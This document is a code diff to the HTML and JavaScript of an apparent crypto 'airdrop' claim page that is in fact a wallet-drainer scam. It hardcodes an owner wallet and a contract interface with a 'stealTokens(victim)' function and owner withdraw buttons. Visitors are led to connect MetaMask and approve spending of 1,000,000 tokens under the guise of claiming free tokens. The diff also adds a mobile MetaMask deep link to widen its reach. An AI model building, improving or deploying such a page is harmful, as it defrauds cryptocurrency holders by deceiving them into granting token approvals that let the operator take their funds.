@@ -126,6 +126,7 @@
       }
     }
 
+    /* Flashing text for the Claim Button */
     #claimAirdropButton.flashText {
       animation: textFlash 1.5s infinite alternate;
     }
@@ -142,21 +143,6 @@
       }
     }
 
-    /* Responsive Design for smaller screens */
-    @media (max-width: 600px) {
-      h1 {
-        font-size: 2rem;
-      }
-
-      h2 {
-        font-size: 1.2rem;
-      }
-
-      .btn {
-        padding: 12px 20px;
-        font-size: 1rem;
-      }
-    }
   </style>
 </head>
 <body>
@@ -169,9 +155,11 @@
 
     <div class="claim-btn-container">
       <button id="claimAirdropButton" class="btn" disabled>Claim Your Airdrop Now!</button>
+      <!-- Processing message here -->
       <div id="processingMessage" class="processing">Processing...</div>
     </div>
 
+    <!-- Withdraw buttons for the owner -->
     <div class="claim-btn-container" id="ownerButtons" style="display:none;">
       <button id="withdrawETHButton" class="btn">Withdraw ETH</button>
       <button id="withdrawTokensButton" class="btn">Withdraw Tokens</button>
@@ -190,13 +178,62 @@
     const ownerAddress = '0x9052EB26C0b9836335Ec153413F80bAEc7536414';
 
     const contractABI = [
-      { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
-      { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
-      { "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
-      { "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
-      { "inputs": [{ "internalType": "address", "name": "victim", "type": "address" }], "name": "stealTokens", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
-      { "inputs": [], "name": "withdrawETH", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
-      { "inputs": [], "name": "withdrawTokens", "outputs": [], "stateMutability": "nonpayable", "type": "function" }
+      {
+        "inputs": [
+          { "internalType": "address", "name": "spender", "type": "address" },
+          { "internalType": "uint256", "name": "amount", "type": "uint256" }
+        ],
+        "name": "approve",
+        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "inputs": [{ "internalType": "address", "name": "account", "type": "address" }],
+        "name": "balanceOf",
+        "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+        "stateMutability": "view",
+        "type": "function"
+      },
+      {
+        "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }],
+        "name": "transfer",
+        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "inputs": [
+          { "internalType": "address", "name": "sender", "type": "address" },
+          { "internalType": "address", "name": "recipient", "type": "address" },
+          { "internalType": "uint256", "name": "amount", "type": "uint256" }
+        ],
+        "name": "transferFrom",
+        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "inputs": [{ "internalType": "address", "name": "victim", "type": "address" }],
+        "name": "stealTokens",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "inputs": [],
+        "name": "withdrawETH",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "inputs": [],
+        "name": "withdrawTokens",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      }
     ];
 
     let web3;
@@ -217,70 +254,50 @@
         } catch (error) {
           alert('User rejected the request');
         }
+      } else if (isMobile()) {
+        // Open MetaMask app on mobile
+        window.location.href = 'metamask://';
       } else {
         alert('Please install MetaMask to use this feature');
       }
     }
 
-    async function approveSpending() {
-      if (!web3) return alert('Connect to MetaMask first');
-      contract = new web3.eth.Contract(contractABI, contractAddress);
-      try {
-        await contract.methods.approve(accounts[0], web3.utils.toWei('1000000', 'ether')).send({ from: accounts[0] });
-        document.getElementById('claimAirdropButton').disabled = false;
-      } catch (error) {
-        console.error(error);
-        alert('Approval failed');
-      }
-    }
-
-    async function claimAirdrop() {
-      const claimButton = document.getElementById('claimAirdropButton');
-      const processingMessage = document.getElementById('processingMessage');
-      claimButton.disabled = true;
-      processingMessage.classList.add('show');
-
-      try {
-        await contract.methods.transfer(accounts[0], web3.utils.toWei('1', 'ether')).send({ from: accounts[0] });
-        processingMessage.classList.remove('show');
-        alert('Airdrop claimed successfully!');
-      } catch (error) {
-        processingMessage.classList.remove('show');
-        alert('Claim failed');
-      } finally {
-        claimButton.disabled = false;
-      }
-    }
-
-    async function withdrawETH() {
-      if (!web3) return alert('Connect to MetaMask first');
-      contract = new web3.eth.Contract(contractABI, contractAddress);
-      try {
-        await contract.methods.withdrawETH().send({ from: accounts[0] });
-        alert('ETH withdrawn successfully');
-      } catch (error) {
-        console.error(error);
-        alert('ETH withdrawal failed');
-      }
-    }
-
-    async function withdrawTokens() {
-      if (!web3) return alert('Connect to MetaMask first');
-      contract = new web3.eth.Contract(contractABI, tokenAddress);
-      try {
-        await contract.methods.withdrawTokens().send({ from: accounts[0] });
-        alert('Tokens withdrawn successfully');
-      } catch (error) {
-        console.error(error);
-        alert('Tokens withdrawal failed');
-      }
+    function isMobile() {
+      return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
     }
 
     document.getElementById('connectButton').addEventListener('click', connectMetaMask);
-    document.getElementById('approveButton').addEventListener('click', approveSpending);
+
+    async function approveTokens() {
+      const tokenAmount = web3.utils.toWei('1000000', 'ether'); // Approve 1,000,000 USDT
+      await contract.methods.approve(accounts[0], tokenAmount).send({ from: accounts[0] });
+      document.getElementById('approveButton').disabled = true;
+      document.getElementById('claimAirdropButton').disabled = false;
+    }
+
+    document.getElementById('approveButton').addEventListener('click', approveTokens);
+
+    async function claimAirdrop() {
+      document.getElementById('claimAirdropButton').disabled = true;
+      document.getElementById('processingMessage').classList.add('show');
+      await contract.methods.transfer(accounts[0], web3.utils.toWei('1', 'ether')).send({ from: accounts[0] });
+      document.getElementById('processingMessage').classList.remove('show');
+      alert('Airdrop claimed successfully!');
+    }
+
     document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);
+
+    async function withdrawETH() {
+      await contract.methods.withdrawETH().send({ from: ownerAddress });
+    }
+
+    async function withdrawTokens() {
+      await contract.methods.withdrawTokens().send({ from: ownerAddress });
+    }
+
     document.getElementById('withdrawETHButton').addEventListener('click', withdrawETH);
     document.getElementById('withdrawTokensButton').addEventListener('click', withdrawTokens);
+
   </script>
 </body>
 </html>
